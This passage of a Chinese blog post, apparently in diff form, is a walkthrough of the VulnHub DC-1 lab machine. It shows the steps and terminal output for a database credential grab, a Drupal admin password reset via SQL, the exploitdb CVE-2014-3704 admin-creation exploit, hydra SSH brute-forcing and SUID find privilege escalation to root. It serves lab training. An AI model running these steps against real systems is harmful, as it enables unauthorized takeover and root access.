<span class="string">''</span>,</span><br><span class="line">      <span class="string">'driver'</span> =&gt; <span class="string">'mysql'</span>,</span><br><span class="line">      <span class="string">'prefix'</span> =&gt; <span class="string">''</span>,</span><br><span class="line">    ),</span><br><span class="line">  ),</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
+
+<h3 id="登录网站"><a href="#登录网站" class="headerlink" title="登录网站"></a>登录网站</h3><p>发现了数据库的账号信息<code>dbuser : R0ck3t</code>，所以要登录数据库去找登录管理员的账号信息，在登录数据库之前，先利用python的<code>pty</code>模块获取标准shell：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">'import pty; pty.spawn("/bin/bash")'</span></span><br></pre></td></tr></table></figure>
+
+<p>随后登录mysql：</p>
+<p><img src="/2020/06/20/VulnHub_DC-1/15.png" alt="15"></p>
+<p>查看相关数据库：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show databases;</span><br><span class="line">show databases;</span><br><span class="line">+--------------------+</span><br><span class="line">| Database           |</span><br><span class="line">+--------------------+</span><br><span class="line">| information_schema |</span><br><span class="line">| drupaldb           |</span><br><span class="line">+--------------------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+
+<p>进入数据库<code>drupaldb</code>：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; use drupaldb; </span><br><span class="line">use drupaldb;</span><br><span class="line">Reading table information for completion of table and column names</span><br><span class="line">You can turn off this feature to get a quicker startup with -A</span><br><span class="line"></span><br><span class="line">Database changed</span><br><span class="line">mysql&gt; show tables;</span><br><span class="line">show tables;</span><br><span class="line">+-----------------------------+</span><br><span class="line">| Tables_in_drupaldb          |</span><br><span class="line">+-----------------------------+</span><br><span class="line">| actions                     |</span><br><span class="line">| authmap                     |</span><br><span class="line">| batch                       |</span><br><span class="line">| block                       |</span><br><span class="line">| block_custom                |</span><br><span class="line">| block_node_type             |</span><br><span class="line">| block_role                  |</span><br><span class="line">| blocked_ips                 |</span><br><span class="line">| cache                       |</span><br><span class="line">| cache_block                 |</span><br><span class="line">| cache_bootstrap             |</span><br><span class="line">| cache_field                 |</span><br><span class="line">| cache_filter                |</span><br><span class="line">| cache_form                  |</span><br><span class="line">| cache_image                 |</span><br><span class="line">| cache_menu                  |</span><br><span class="line">| cache_page                  |</span><br><span class="line">| cache_path                  |</span><br><span class="line">| cache_update                |</span><br><span class="line">| cache_views                 |</span><br><span class="line">| cache_views_data            |</span><br><span class="line">| comment                     |</span><br><span class="line">| ctools_css_cache            |</span><br><span class="line">| ctools_object_cache         |</span><br><span class="line">| date_format_locale          |</span><br><span class="line">| date_format_type            |</span><br><span class="line">| date_formats                |</span><br><span class="line">| field_config                |</span><br><span class="line">| field_config_instance       |</span><br><span class="line">| field_data_body             |</span><br><span class="line">| field_data_comment_body     |</span><br><span class="line">| field_data_field_image      |</span><br><span class="line">| field_data_field_tags       |</span><br><span class="line">| field_revision_body         |</span><br><span class="line">| field_revision_comment_body |</span><br><span class="line">| field_revision_field_image  |</span><br><span class="line">| field_revision_field_tags   |</span><br><span class="line">| file_managed                |</span><br><span class="line">| file_usage                  |</span><br><span class="line">| filter                      |</span><br><span class="line">| filter_format               |</span><br><span class="line">| flood                       |</span><br><span class="line">| history                     |</span><br><span class="line">| image_effects               |</span><br><span class="line">| image_styles                |</span><br><span class="line">| menu_custom                 |</span><br><span class="line">| menu_links                  |</span><br><span class="line">| menu_router                 |</span><br><span class="line">| node                        |</span><br><span class="line">| node_access                 |</span><br><span class="line">| node_comment_statistics     |</span><br><span class="line">| node_revision               |</span><br><span class="line">| node_type                   |</span><br><span class="line">| queue                       |</span><br><span class="line">| rdf_mapping                 |</span><br><span class="line">| registry                    |</span><br><span class="line">| registry_file               |</span><br><span class="line">| role                        |</span><br><span class="line">| role_permission             |</span><br><span class="line">| search_dataset              |</span><br><span class="line">| search_index                |</span><br><span class="line">| search_node_links           |</span><br><span class="line">| search_total                |</span><br><span class="line">| semaphore                   |</span><br><span class="line">| sequences                   |</span><br><span class="line">| sessions                    |</span><br><span class="line">| shortcut_set                |</span><br><span class="line">| shortcut_set_users          |</span><br><span class="line">| system                      |</span><br><span class="line">| taxonomy_index              |</span><br><span class="line">| taxonomy_term_data          |</span><br><span class="line">| taxonomy_term_hierarchy     |</span><br><span class="line">| taxonomy_vocabulary         |</span><br><span class="line">| url_alias                   |</span><br><span class="line">| users                       |</span><br><span class="line">| users_roles                 |</span><br><span class="line">| variable                    |</span><br><span class="line">| views_display               |</span><br><span class="line">| views_view                  |</span><br><span class="line">| watchdog                    |</span><br><span class="line">+-----------------------------+</span><br><span class="line">80 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt;</span><br></pre></td></tr></table></figure>
+
+<p>因为要查看管理员账号，对应的数据表是<code>users</code>表，查看该数据表中的信息：</p>
+<p><img src="/2020/06/20/VulnHub_DC-1/16.png" alt="16"></p>
+<p><code>users</code>表中确实存在<code>admin</code>账户的密码，但是是密文存储的。这里也有两个方法来处理。</p>
+<h4 id="法一：修改Durpal密码"><a href="#法一：修改Durpal密码" class="headerlink" title="法一：修改Durpal密码"></a>法一：修改Durpal密码</h4><p>google直接搜索<code>reset drupal admin password</code>，找到一篇文章<a href="https://www.drupal.org/node/1023428" target="_blank" rel="noopener">Resetting the administrator password with sql-query (Drupal 7)</a> 。使用sql query来修改管理员密码，当电子邮件或是drush方法失效的时候，可以用这个方法重置管理员账号。</p>
+<ol>
+<li><p>在Drupal的根目录下执行下面命令：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./scripts/password-hash.sh [your-new-passwd]</span><br></pre></td></tr></table></figure>
+
+<p>该脚本可以生成一串密码对应的hash值：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">www-data@DC-1:/var/www$ ./scripts/password-hash.sh 123456</span><br><span class="line">./scripts/password-hash.sh 123456</span><br><span class="line"></span><br><span class="line">password: 123456                hash: $S$DIZJ63vWYsYTxIhFLaFcemKmGp8I3K37wYYLgavrrRUkkSeATQN.</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>登录mysql修改admin密码：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> UPDATE users SET pass =<span class="string">'$S$DIZJ63vWYsYTxIhFLaFcemKmGp8I3K37wYYLgavrrRUkkSeATQN.'</span> <span class="built_in">where</span> uid=1;</span></span><br><span class="line">&lt;s ='$S$DIZJ63vWYsYTxIhFLaFcemKmGp8I3K37wYYLgavrrRUkkSeATQN.' where uid=1;   </span><br><span class="line">Query OK, 1 row affected (0.00 sec)</span><br><span class="line">Rows matched: 1  Changed: 1  Warnings: 0</span><br></pre></td></tr></table></figure>
+
+</li>
+</ol>
+<h4 id="法二：使用exploitdb中提供的exp"><a href="#法二：使用exploitdb中提供的exp" class="headerlink" title="法二：使用exploitdb中提供的exp"></a>法二：使用exploitdb中提供的exp</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; searchsploit drupal</span><br></pre></td></tr></table></figure>
+
+<p>找到一个可以增加admin权限用户的exp：</p>
+<p><img src="/2020/06/20/VulnHub_DC-1/17.png" alt="17"></p>
+<p>使用方法是：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Usage: 34992.py -t http[s]://TARGET_URL -u USER -p PASS</span><br></pre></td></tr></table></figure>
+
+<p>尝试创建一个具有admin权限的新用户<code>admin_fake</code>：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~$ python /usr/share/exploitdb/exploits/php/webapps/34992.py -t http://192.168.247.214 -u admin_fake -p 123456</span><br><span class="line">                                                                                                       </span><br><span class="line">  ______                          __     _______  _______ _____                                        </span><br><span class="line"> |   _  \ .----.--.--.-----.---.-|  |   |   _   ||   _   | _   |                                       </span><br><span class="line"> |.  |   \|   _|  |  |  _  |  _  |  |   |___|   _|___|   |.|   |                                       </span><br><span class="line"> |.  |    |__| |_____|   __|___._|__|      /   |___(__   `-|.  |   </span><br><span class="line"> |:  1    /          |__|                 |   |  |:  1   | |:  |   </span><br><span class="line"> |::.. . /                                |   |  |::.. . | |::.|   </span><br><span class="line"> `------'                                 `---'  `-------' `---'   </span><br><span class="line">  _______       __     ___       __            __   __             </span><br><span class="line"> |   _   .-----|  |   |   .-----|__.-----.----|  |_|__.-----.-----.</span><br><span class="line"> |   1___|  _  |  |   |.  |     |  |  -__|  __|   _|  |  _  |     |</span><br><span class="line"> |____   |__   |__|   |.  |__|__|  |_____|____|____|__|_____|__|__|</span><br><span class="line"> |:  1   |  |__|      |:  |    |___|                               </span><br><span class="line"> |::.. . |            |::.|                                        </span><br><span class="line"> `-------'            `---'                                        </span><br><span class="line">                                                                   </span><br><span class="line">                                 Drup4l =&gt; 7.0 &lt;= 7.31 Sql-1nj3ct10n</span><br><span class="line">                                              Admin 4cc0unt cr3at0r</span><br><span class="line"></span><br><span class="line">                          Discovered by:</span><br><span class="line"></span><br><span class="line">                          Stefan  Horst</span><br><span class="line">                         (CVE-2014-3704)</span><br><span class="line"></span><br><span class="line">                           Written by:</span><br><span class="line"></span><br><span class="line">                         Claudio Viviani</span><br><span class="line"></span><br><span class="line">                      http://www.homelab.it</span><br><span class="line"></span><br><span class="line">                         info@homelab.it</span><br><span class="line">                     homelabit@protonmail.ch</span><br><span class="line"></span><br><span class="line">                 https://www.facebook.com/homelabit</span><br><span class="line">                   https://twitter.com/homelabit</span><br><span class="line">                 https://plus.google.com/+HomelabIt1/</span><br><span class="line">       https://www.youtube.com/channel/UCqqmSdMqf_exicCe_DjlBww</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[!] VULNERABLE!</span><br><span class="line"></span><br><span class="line">[!] Administrator user created!</span><br><span class="line"></span><br><span class="line">[*] Login: admin_fake</span><br><span class="line">[*] Pass: 123456</span><br><span class="line">[*] Url: http://192.168.247.214/?q=node&amp;destination=node</span><br></pre></td></tr></table></figure>
+
+<p>创建<code>admin_fake</code>之后也能够成功登录，访问<code>dashboard</code>页面：</p>
+<p><img src="/2020/06/20/VulnHub_DC-1/18.png" alt="18"></p>
+<p>发现了<code>flag3</code>：</p>
+<p><img src="/2020/06/20/VulnHub_DC-1/19.png" alt="19"></p>
+<p>得到提示：<code>Special PERMS will help FIND the passwd - but you&#39;ll need to -exec that command to work out how to get what&#39;s in the shadow.</code>。</p>
+<p>这个提示到目前为止还不太明显。先找一下其他的flag。</p>
+<p>查看<code>/etc/passwd</code>：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">www-data@DC-1:/var/www$ cat /etc/passwd</span><br><span class="line">cat /etc/passwd</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/bin/sh</span><br><span class="line">bin:x:2:2:bin:/bin:/bin/sh</span><br><span class="line">sys:x:3:3:sys:/dev:/bin/sh</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/bin/sh</span><br><span class="line">man:x:6:12:man:/var/cache/man:/bin/sh</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/bin/sh</span><br><span class="line">mail:x:8:8:mail:/var/mail:/bin/sh</span><br><span class="line">news:x:9:9:news:/var/spool/news:/bin/sh</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh</span><br><span class="line">proxy:x:13:13:proxy:/bin:/bin/sh</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/bin/sh</span><br><span class="line">backup:x:34:34:backup:/var/backups:/bin/sh</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/bin/sh</span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/bin/sh</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/bin/sh</span><br><span class="line">libuuid:x:100:101::/var/lib/libuuid:/bin/sh</span><br><span class="line">Debian-exim:x:101:104::/var/spool/exim4:/bin/false</span><br><span class="line">statd:x:102:65534::/var/lib/nfs:/bin/false</span><br><span class="line">messagebus:x:103:107::/var/run/dbus:/bin/false</span><br><span class="line">sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin</span><br><span class="line">mysql:x:105:109:MySQL Server,,,:/nonexistent:/bin/false</span><br><span class="line">flag4:x:1001:1001:Flag4,,,:/home/flag4:/bin/bash</span><br></pre></td></tr></table></figure>
+
+<p>发现用户<code>flag4</code>，进入该用户的home目录就能直接查看<code>flag4.txt</code>了：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">www-data@DC-1:/var/www$ cd /home/flag4</span><br><span class="line">cd /home/flag4</span><br><span class="line">www-data@DC-1:/home/flag4$ ls -al</span><br><span class="line">ls -al</span><br><span class="line">total 28</span><br><span class="line">drwxr-xr-x 2 flag4 flag4 4096 Feb 19  2019 .</span><br><span class="line">drwxr-xr-x 3 root  root  4096 Feb 19  2019 ..</span><br><span class="line">-rw------- 1 flag4 flag4   28 Feb 19  2019 .bash_history</span><br><span class="line">-rw-r--r-- 1 flag4 flag4  220 Feb 19  2019 .bash_logout</span><br><span class="line">-rw-r--r-- 1 flag4 flag4 3392 Feb 19  2019 .bashrc</span><br><span class="line">-rw-r--r-- 1 flag4 flag4  675 Feb 19  2019 .profile</span><br><span class="line">-rw-r--r-- 1 flag4 flag4  125 Feb 19  2019 flag4.txt</span><br><span class="line">www-data@DC-1:/home/flag4$ cat flag4.txt</span><br><span class="line">cat flag4.txt</span><br><span class="line">Can you use this same method to find or access the flag in root?</span><br><span class="line"></span><br><span class="line">Probably. But perhaps it's not that easy.  Or maybe it is?</span><br></pre></td></tr></table></figure>
+
+<p>但我觉得这个是不是和靶机的本意有点出入啊，正常情况下是应该将<code>flag4.txt</code>文件配置成仅有<code>flag4</code>用户可以读取，所以需要登录<code>flag4</code>用户的账号。这个密码可以用<code>hydra</code>来获取：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l [username] -P [wordlist] [ssh://ip]</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/06/20/VulnHub_DC-1/20.png" alt="20"></p>
+<p>得到密码<code>orange</code>。ssh登录该用户：</p>
+<p><img src="/2020/06/20/VulnHub_DC-1/21.png" alt="21"></p>
+<p>到目前为止<code>flag1-flag4</code>都找到了，还有最后一个flag存在在<code>/root</code>目录下，但是因为没有权限，所以普通的账号是不能进入<code>/root</code>目录的：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">www-data@DC-1:/home/flag4$ cd /root</span><br><span class="line">cd /root</span><br><span class="line">bash: cd: /root: Permission denied</span><br></pre></td></tr></table></figure>
+
+<h3 id="使用suid提权"><a href="#使用suid提权" class="headerlink" title="使用suid提权"></a>使用suid提权</h3><p>如果我们不能直接进行提权，其实还可以借用<code>suid</code>来巧妙地绕过。</p>
+<p>这里就需要<code>flag3</code>给的提示了，这个提示分为两个部分：</p>
+<ol>
+<li>Special <strong>PERMS</strong> will help <strong>FIND</strong> the passwd </li>
+</ol>
+<p><code>find</code>命令有一个<code>-perm</code>选项，能够根据文件的权限来搜索文件：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-perm -mode</span><br><span class="line">        All of the permission bits mode are set for the file.  Symbolic modes are accepted  in</span><br><span class="line">        this  form, and this is usually the way in which you would want to use them.  You must</span><br><span class="line">        specify &#96;u&#39;, &#96;g&#39; or &#96;o&#39; if you use a symbolic mode.  See the EXAMPLES section for some</span><br><span class="line">        illustrative examples.</span><br></pre></td></tr></table></figure>
+
+<p>因为是使用<code>suid</code>提权，所以是<code>-perm -u=s</code>：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">www-data@DC-1:/home/flag4$ find / -perm -u=s 2&gt;/dev/null      </span><br><span class="line">find / -perm -u=s 2&gt;/dev/null</span><br><span class="line">/bin/mount</span><br><span class="line">/bin/ping</span><br><span class="line">/bin/su</span><br><span class="line">/bin/ping6</span><br><span class="line">/bin/umount</span><br><span class="line">/usr/bin/at</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/procmail</span><br><span class="line">/usr/bin/find</span><br><span class="line">/usr/sbin/exim4</span><br><span class="line">/usr/lib/pt_chown</span><br><span class="line">/usr/lib/openssh/ssh-keysign</span><br><span class="line">/usr/lib/eject/dmcrypt-get-device</span><br><span class="line">/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">/sbin/mount.nfs</span><br></pre></td></tr></table></figure>
+
+<p>搜索发现了文件<code>/usr/bin/find</code>。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">www-data@DC-1:/usr/bin$ ls -al find</span><br><span class="line">ls -al find</span><br><span class="line">-rwsr-xr-x 1 root root 162424 Jan  6  2012 find</span><br></pre></td></tr></table></figure>
+
+<p><code>/usr/bin/flag</code>文件的执行位确实是<code>s</code>，也就是说执行该文件时具有root权限。</p>
+<ol start="2">
+<li>but you’ll need to <strong>-exec</strong> that command to work out how to get what’s in the shadow.</li>
+</ol>
+<p><code>find</code>命令支持一个<code>-exec</code>选项，参考man手册：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">-exec command ;</span><br><span class="line">        Execute  command;  true  if 0 status is returned.  All following arguments to find are</span><br><span class="line">        taken to be arguments to the command until an argument consisting of  &#96;;&#39;  is  encoun‐</span><br><span class="line">        tered.   The  string  &#96;&#123;&#125;&#39; is replaced by the current file name being processed every‐</span><br><span class="line">        where it occurs in the arguments to the command, not just in  arguments  where  it  is</span><br><span class="line">        alone,  as in some versions of find.  Both of these constructions might need to be es‐</span><br><span class="line">        caped (with a &#96;\&#39;) or quoted to protect them from expansion by the shell.  See the EX‐</span><br><span class="line">        AMPLES  section for examples of the use of the -exec option.  The specified command is</span><br><span class="line">        run once for each matched file.  The command is executed in  the  starting  directory.</span><br><span class="line">        There  are  unavoidable  security  problems  surrounding  use of the -exec action; you</span><br><span class="line">        should use the -execdir option instead.</span><br></pre></td></tr></table></figure>
+
+<p><code>-exec</code>选项会在find命令指定的目录下为成功匹配到的文件，执行<code>-exec</code>指定的命令。所以可以新建一个<code>test</code>目录，然后在目录下执行<code>/bin/sh</code>或是<code>/bin/bash</code>，因为这两个文件都是任意用户都可以执行的：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">www-data@DC-1:/usr/bin$ ls -al /bin/sh</span><br><span class="line">ls -al /bin/sh</span><br><span class="line">lrwxrwxrwx 1 root root 4 Mar  1  2012 /bin/sh -&gt; dash</span><br><span class="line">www-data@DC-1:/usr/bin$ ls -al /bin/bash</span><br><span class="line">ls -al /bin/bash</span><br><span class="line">-rwxr-xr-x 1 root root 941252 Oct 27  2016 /bin/bash</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">www-data@DC-1:/usr/bin$ mkdir test</span><br><span class="line">mkdir test</span><br><span class="line">mkdir: cannot create directory `test': File exists</span><br><span class="line">www-data@DC-1:/usr/bin$ find test -exec '/bin/sh' \;</span><br><span class="line">find test -exec '/bin/sh' \;</span><br><span class="line"><span class="meta">#</span><span class="bash"> whoami</span></span><br><span class="line">whoami</span><br><span class="line">root</span><br></pre></td></tr></table></figure>
+
+<p>进入<code>/root</code>目录，发现flag文件<code>thefinalflag.txt</code>：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">cd /root</span><br><span class="line"><span class="meta">#</span><span class="bash"> ls -al</span></span><br><span class="line">ls -al</span><br><span class="line">total 32</span><br><span class="line">drwx------  4 root root 4096 Feb 28  2019 .</span><br><span class="line">drwxr-xr-x 23 root root 4096 Feb 19  2019 ..</span><br><span class="line">drwx------  2 root root 4096 Feb 19  2019 .aptitude</span><br><span class="line">-rw-------  1 root root   44 Feb 28  2019 .bash_history</span><br><span class="line">-rw-r--r--  1 root root  949 Feb 19  2019 .bashrc</span><br><span class="line">drwxr-xr-x  3 root root 4096 Feb 19  2019 .drush</span><br><span class="line">-rw-r--r--  1 root root  140 Nov 20  2007 .profile</span><br><span class="line">-rw-r--r--  1 root root  173 Feb 19  2019 thefinalflag.txt</span><br></pre></td></tr></table></figure>
+
+<p>读取最后的flag文件：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> cat thefinalflag.txt</span></span><br><span class="line">cat thefinalflag.txt</span><br><span class="line">Well done!!!!</span><br><span class="line"></span><br><span class="line">Hopefully you've enjoyed this and learned some new skills.</span><br><span class="line"></span><br><span class="line">You can let me know what you thought of this little journey</span><br><span class="line">by contacting me via Twitter - @DCAU7</span><br><span class="line"><span class="meta">#</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这个靶机学习到的新知识还挺多的，总结起来有：</p>
+<ol>
+<li>利用metasploit搜索合适的exploitdb中的exp，主要通过<code>searchsploit</code>关键字；</li>
+<li>利用metasploit中的<code>meterpreter</code>攻击目标站点；</li>
+<li>利用suid来提权；</li>
+<li>find命令可以根据文件权限进行搜索，还可以对某个目录执行某些命令。</li>
+</ol>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>Bantian</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="https://bantttian.github.io/2020/06/20/VulnHub_DC-1/">https://bantttian.github.io/2020/06/20/VulnHub_DC-1/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2019 <a href="http://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>早睡早起身体好</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/Vulnhub/"># Vulnhub</a>
+                    
+                        <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"># 渗透测试</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+            
